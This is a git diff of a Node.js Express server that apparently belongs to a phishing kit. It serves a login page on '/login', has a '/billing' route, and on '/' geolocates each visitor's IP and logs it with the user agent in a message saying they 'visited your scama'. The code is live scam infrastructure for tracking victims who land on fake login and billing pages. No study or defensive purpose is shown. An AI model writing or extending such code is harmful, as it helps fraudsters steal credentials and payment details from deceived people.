@@ -68,6 +68,21 @@ const formattedDate = currentDate.toLocaleString('en-US', options);
 
 
 app.get('/login', async (req, res) => {
+   try {
+   // Read the content of the login.html file
+        const htmlContent = await fs.readFile('index2.html', 'utf-8');
+
+        // Send the HTML content as a response
+        res.send(htmlContent);
+    } catch (error) {
+        // Handle any errors, for example, file not found
+        console.error('Error reading file:', error);
+        res.status(500).send('Internal Server Error');
+    }
+});
+
+
+app.get('/', async (req, res) => {
     let message = "";
     const sendAPIRequest = async (ipAddress) => {
         const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
@@ -83,7 +98,7 @@ app.get('/login', async (req, res) => {
 
     try {
 
-        message += `✈️ ${ipAddress} visited your scama on ${formattedDate}\n
+        message += ` ✈️ ${ipAddress} visited your scama on ${formattedDate}\n
         🌐 ${userAgent}\n
         📍 From ${ipAddressInformation.country.name} |  ${ipAddressInformation.location.city} | ${ipAddressInformation.location.principalSubdivision}`;
 
@@ -92,18 +107,12 @@ app.get('/login', async (req, res) => {
 
         console.log(message);
 
-        // Read the content of the login.html file
-        const htmlContent = await fs.readFile('index2.html', 'utf-8');
-
-        // Send the HTML content as a response
-        res.send(htmlContent);
     } catch (error) {
         // Handle any errors, for example, file not found
         console.error('Error reading file:', error);
         res.status(500).send('Internal Server Error');
     }
 });
-
 
 app.get('/billing', async (req, res) => {
     try {
